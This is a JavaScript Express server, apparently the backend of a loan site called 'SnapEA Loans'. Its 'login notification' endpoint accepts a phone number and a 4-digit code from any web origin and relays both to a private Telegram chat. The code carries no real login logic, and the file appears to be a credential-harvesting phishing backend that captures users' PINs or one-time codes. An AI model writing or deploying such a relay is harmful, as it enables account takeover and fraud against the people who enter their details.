import express from "express";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();

const {
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  PORT = 4000,
  ALLOWED_ORIGIN = "*",
} = process.env;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("Missing Telegram environment variables.");
  process.exit(1);
}

const app = express();

app.use(express.json());

const origins = ALLOWED_ORIGIN
  .split(",")
  .map((origin) => origin.trim());

app.use(
  cors({
    origin: origins.includes("*") ? "*" : origins,
  })
);

// ===============================
// RATE LIMITER
// ===============================

const hits = new Map();

function rateLimited(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const maxRequests = 5;

  const previous = hits.get(ip) || [];

  const recent = previous.filter(
    (timestamp) => now - timestamp < windowMs
  );

  recent.push(now);
  hits.set(ip, recent);

  return recent.length > maxRequests;
}

// ===============================
// VALIDATION
// ===============================

function isValidPhone(phone) {
  return (
    typeof phone === "string" &&
    /^[+()\-\s\d]{7,20}$/.test(phone.trim())
  );
}

function isValidApplicationCode(code) {
  return (
    typeof code === "string" &&
    /^\d{4}$/.test(code.trim())
  );
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// ===============================
// LOGIN NOTIFICATION
// ===============================

app.post("/api/login-notification", async (req, res) => {
  try {
    const forwardedFor = req.headers["x-forwarded-for"];

    const ip =
      typeof forwardedFor === "string"
        ? forwardedFor.split(",")[0].trim()
        : req.socket.remoteAddress || "unknown";

    if (rateLimited(ip)) {
      return res.status(429).json({
        ok: false,
        error: "Too many requests. Try again shortly.",
      });
    }

    // ONLY these two non-sensitive values are accepted
    const { phone, applicationCode } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({
        ok: false,
        error: "Invalid phone number.",
      });
    }

    if (!isValidApplicationCode(applicationCode)) {
      return res.status(400).json({
        ok: false,
        error: "Invalid 4-digit application code.",
      });
    }

    const message =
      `📩 <b>New Login Notification</b>\n\n` +
      `<b>Phone:</b> ${escapeHtml(phone.trim())}\n` +
      `<b>Application Code:</b> ${escapeHtml(
        applicationCode.trim()
      )}\n` +
      `<b>Time:</b> ${escapeHtml(
        new Date().toLocaleString("en-US")
      )}`;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    const telegramData = await telegramResponse.json();

    if (!telegramData.ok) {
      console.error("Telegram error:", telegramData);

      return res.status(502).json({
        ok: false,
        error: "Unable to send notification.",
      });
    }

    return res.json({
      ok: true,
      message: "Login notification sent.",
    });
  } catch (error) {
    console.error("Server error:", error);

    return res.status(500).json({
      ok: false,
      error: "Internal server error.",
    });
  }
});

// ===============================
// HEALTH CHECK
// ===============================

app.get("/health", (_req, res) => {
  res.json({
    ok: true,
    service: "SnapEA Loans Backend",
  });
});

// ===============================
// START SERVER
// ===============================

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
